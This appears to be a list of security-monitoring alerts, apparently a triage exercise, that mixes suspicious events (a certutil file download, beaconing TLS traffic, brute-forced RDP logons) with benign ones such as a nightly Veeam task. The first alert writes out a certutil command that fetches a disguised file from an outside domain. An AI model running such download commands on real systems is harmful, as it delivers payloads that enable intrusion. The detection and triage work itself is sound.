rule: 100101 - certutil used to download a file
details: certutil.exe -urlcache -split -f http://guiatelefonos.com/data/czx.jpg C:\Users\Public\czx.jpg. Parent process: cmd.exe. The saved file is named .jpg but certutil is not normally used to download pictures.

rule: HTTP request to a bare IP address with an old browser user agent
details: GET /api/file/get-file/264872 to 5.252.153.241 on port 80. User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E). No DNS lookup happened before the connection. Response: 200 OK, application/octet-stream, about 4 MB.

rule: DNS lookups for domains never seen on this network
details: The host looked up aatthews.cfd at 20:05:56 and winrun2915.com at 20:06:33. The user opened quadcinema.com (a movie theatre website) about 38 seconds before the second lookup. Neither new domain has been seen on this network before.

rule: Regular outbound TLS connections to the same server name
details: 16 TLS connections to logincrypt8338.com (Cloudflare addresses) between 20:06:36 and 20:19:08, almost exactly 48 seconds apart. Same packet size (504 bytes) every time. About 80 kB transferred in total.

rule: Workstation is using an external DNS resolver
details: The workstation sent 40 DNS queries to 8.8.8.8 over 10 minutes. Names looked up: outlook.office.com, teams.microsoft.com, slack.com, google.com. The company DNS server is 10.9.11.2. This is a finance team laptop that was used on hotel wifi last week.

schtasks.exe /create /tn VeeamNightlyCatalog /sc daily /st 02:30 with the Veeam catalog service as the program to run. Parent process: Veeam.Backup.Service.exe. The same task is created every night at 02:00 and has been for the last 60 days. This server is in the backup maintenance window.

rule: Large download shortly after new-domain alert
details: 36 MB downloaded from nodejs.org in under 4 seconds. Node.js is not on the approved software list and is not installed on this computer. The same host raised alert A-003 (new domains) 14 seconds earlier.

rule: Multiple failed logons followed by a success
details: 12 failed RDP logons (event 4625) for the account administrator within 90 seconds, then 1 successful logon. Source IP is 10.9.11.77, a sales team workstation. The sales team has no reason to use RDP on the file server.
